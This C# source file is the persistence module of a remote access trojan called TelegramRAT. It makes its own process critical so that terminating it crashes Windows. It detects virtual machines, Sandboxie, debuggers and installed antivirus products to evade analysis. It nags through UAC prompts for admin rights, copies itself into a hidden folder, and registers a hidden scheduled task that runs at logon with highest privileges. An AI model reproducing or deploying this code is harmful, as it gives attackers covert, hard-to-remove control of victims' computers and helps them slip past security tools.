using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace TelegramRAT
{
    internal class persistense
    {

        // Import dll'ls
        [DllImport("kernel32.dll")]
        protected static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        // 
        public static void ShutdownListener()
        {
            SystemEvents.SessionEnding += new SessionEndingEventHandler(SystemEvents_SessionEnding);
        }
        
        // If shutdown/reboot
        private static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
        {
            telegram.sendText("Go to offline...");
            unprotectProcess();
        }

        // Protect process
        public static bool protectProcess()
        {
            if(config.ProcessProtectionEnabled)
            {
                try
                {
                    Process.EnterDebugMode();
                    int iIsCritical = -1;
                    NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref iIsCritical, sizeof(int));
                    return true;
                }
                catch { return false; }
            } else { return false; }
        }

        // Unprotect process
        public static bool unprotectProcess()
        {
            if (config.ProcessProtectionEnabled)
            {
                try
                {
                    Process.EnterDebugMode();
                    int iIsCritical = 0;
                    NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref iIsCritical, sizeof(int));
                    return true;
                }
                catch { return false; }
            }
            else { return false; }
        }

        // VirtualBox
        public static bool inVirtualBox()
        {
            using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                try
                {
                    using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
                    {
                        foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
                        {
                            if ((managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
                            {
                                return true;
                            }
                        }
                    }
                }
                catch
                {
                    return true;
                }
            }
            foreach (ManagementBaseObject managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
            {
                if (managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VMware") && managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VBox"))
                {
                    return true;
                }
            }
            return false;
        }

        // SandBoxie
        public static bool inSandboxie()
        {
            string[] array = new string[5]
            {
                "SbieDll.dll",
                "SxIn.dll",
                "Sf2.dll",
                "snxhk.dll",
                "cmdvrt32.dll"
            };
            for (int i = 0; i < array.Length; i++)
            {
                if (GetModuleHandle(array[i]).ToInt32() != 0)
                {
                    return true;
                }
            }
            return false;
        }

        // Debugger
        public static bool inDebugger()
        {
            try
            {
                long ticks = DateTime.Now.Ticks;
                System.Threading.Thread.Sleep(10);
                if (DateTime.Now.Ticks - ticks < 10L)
                {
                    return true;
                }
            }
            catch { }
            return false;
        }

        // Detect antiviruses
        public static string DetectAntivirus()
        {
            List<string> detected = new List<string>();
            string[] av_path = new string[]
            {
                "AVAST Software\\Avast",
                "AVG\\Antivirus",
                "Avira\\Launcher",
                "IObit\\Advanced SystemCare",
                "Bitdefender Antivirus Free",
                "COMODO\\COMODO Internet Security",
                "DrWeb",
                "ESET\\ESET Security",
                "GRIZZLY Antivirus",
                "Kaspersky Lab",
                "IObit\\IObit Malware Fighter",
                "Norton Security",
                "Panda Security\\Panda Security Protection",
                "360\\Total Security",
                "Windows Defender"
            };

            foreach (string av in av_path)
            {
                string av_dir = Environment.GetEnvironmentVariable("ProgramFiles") + "\\" + av;
                if (Directory.Exists(av_dir))
                {
                    detected.Add(Path.GetFileName(Path.GetDirectoryName(av_dir + "\\")));
                }
            }

            return string.Join(", ", detected) + ".";
        }


        //  TaskScheduler command
        private static void TaskSchedulerCommand(string args)
        {
            // If autorun disabled
            if(!config.AutorunEnabled)
            { return; }
            // Add to autorun
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.FileName = "schtasks.exe";
            startInfo.Arguments = args;
            process.StartInfo = startInfo;
            process.Start();
            process.WaitForExit();
        }

        // Elevate previleges
        public static void elevatePrevileges()
        {
            while (true)
            {
                // Elevate previleges
                if (!utils.IsAdministrator())
                {
                    Process proc = new Process();
                    proc.StartInfo.FileName = Application.ExecutablePath;
                    proc.StartInfo.UseShellExecute = true;
                    proc.StartInfo.Verb = "runas";
                    try
                    {
                        proc.Start();
                        proc.WaitForExit();
                        unprotectProcess();
                        Environment.Exit(1);
                    }
                    catch (System.ComponentModel.Win32Exception)
                    { 
                        if(config.AdminRightsRequired)
                        { continue; } else { break; }
                    }
                } else { break; }
            }
        }

        
        // Copy self to system
        public static void installSelf()
        {
            if(!Directory.Exists(Path.GetDirectoryName(config.InstallPath)))
            {
                // Create dir
                Directory.CreateDirectory(Path.GetDirectoryName(config.InstallPath));
            }
            if(!System.IO.File.Exists(config.InstallPath))
            {
                // Copy
                System.IO.File.Copy(Application.ExecutablePath, config.InstallPath);
                // Hide dir
                if(config.HideDirectoryEnabled)
                {
                    DirectoryInfo dir = new DirectoryInfo(Path.GetDirectoryName(config.InstallPath));
                    dir.Attributes = FileAttributes.Hidden;
                }
            }
        }

        // Install to startup
        public static void setAutorun()
        {
            TaskSchedulerCommand("/create /f /sc ONLOGON /RL HIGHEST /tn \"" + config.AutorunName + "\" /tr \"" + config.InstallPath + "\"");
        }

        // Uninstall from startup
        public static void delAutorun()
        {
            TaskSchedulerCommand("/delete /f /tn \"" + config.AutorunName + "\"");
        }

        


    }
}
